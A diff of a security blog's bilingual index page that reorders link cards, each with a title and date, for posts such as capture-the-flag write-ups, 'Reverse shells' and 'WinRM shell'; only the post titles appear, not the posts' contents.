+      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reddish write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">26 Jan 2019</time>
+      <time lang="el">26 Ιαν 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Legacy write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Oct 2017</time>
+      <time lang="el">19 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">27 Jul 2019</time>
+      <time lang="el">27 Ιουλ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
     <div class="cell">
@@ -886,6 +1407,22 @@ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Node write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Node</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">03 Mar 2018</time>
+      <time lang="el">03 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
           
            
            
@@ -893,6 +1430,206 @@ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
           
            
            
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fulcrum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Jun 2018</time>
+      <time lang="el">09 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Enterprise write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Mar 2018</time>
+      <time lang="el">19 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fortune write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">02 Aug 2019</time>
+      <time lang="el">02 Αυγ 2019</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -986,290 +1723,6 @@ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Tally write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 May 2018</time>
-      <time lang="el">03 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Optimum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">28 Oct 2017</time>
-      <time lang="el">28 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Node write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Node</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 Mar 2018</time>
-      <time lang="el">03 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Enterprise write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Mar 2018</time>
-      <time lang="el">19 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">13 May 2018</time>
-      <time lang="el">13 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Querier write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Jun 2019</time>
-      <time lang="el">22 Ιουν 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
     <div class="cell">
@@ -1302,413 +1755,21 @@ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Fortune write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
+      <h3 class="title" lang="en">Optimum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">02 Aug 2019</time>
-      <time lang="el">02 Αυγ 2019</time>
+      <time lang="en">28 Oct 2017</time>
+      <time lang="el">28 Οκτ 2017</time>
     </footer>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Legacy write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Oct 2017</time>
-      <time lang="el">19 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">27 Jul 2019</time>
-      <time lang="el">27 Ιουλ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/unattended_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/unattended.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Unattended write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Unattended</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">23 Aug 2019</time>
-      <time lang="el">23 Αυγ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Fulcrum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">09 Jun 2018</time>
-      <time lang="el">09 Ιουν 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Minion write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">10 Apr 2018</time>
-      <time lang="el">10 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/rold/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
-      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">16 Aug 2015</time>
-      <time lang="el">16 Αυγ 2015</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Reddish write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">26 Jan 2019</time>
-      <time lang="el">26 Ιαν 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Sense write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">24 Mar 2018</time>
-      <time lang="el">24 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
            
           
            
@@ -1763,115 +1824,6 @@ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
            
            
           
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/oracle/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Ask and you shall receive</h3>
-      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">04 May 2019</time>
-      <time lang="el">04 Μαϊ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
           
            
            
@@ -1966,62 +1918,6 @@ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
            
            
            
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Path-traversal archiver</h3>
-      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">14 May 2019</time>
-      <time lang="el">14 Μαϊ 2019</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -2123,6 +2019,205 @@ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
            
            
            
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
+      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Apr 2018</time>
+      <time lang="el">09 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Path-traversal archiver</h3>
+      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">14 May 2019</time>
+      <time lang="el">14 Μαϊ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/oracle/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Ask and you shall receive</h3>
+      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">04 May 2019</time>
+      <time lang="el">04 Μαϊ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reverse shells</h3>
+      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">12 Apr 2018</time>
+      <time lang="el">12 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -2320,22 +2415,6 @@ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Reverse shells</h3>
-      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">12 Apr 2018</time>
-      <time lang="el">12 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
           
            
            
@@ -2425,37 +2504,6 @@ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
            
            
            
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
-      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">09 Apr 2018</time>
-      <time lang="el">09 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
